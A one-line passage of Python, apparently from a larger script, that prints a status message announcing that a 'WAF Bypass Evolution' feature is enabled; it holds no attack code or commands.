    print(f"WAF Bypass Evolution: ENABLED")

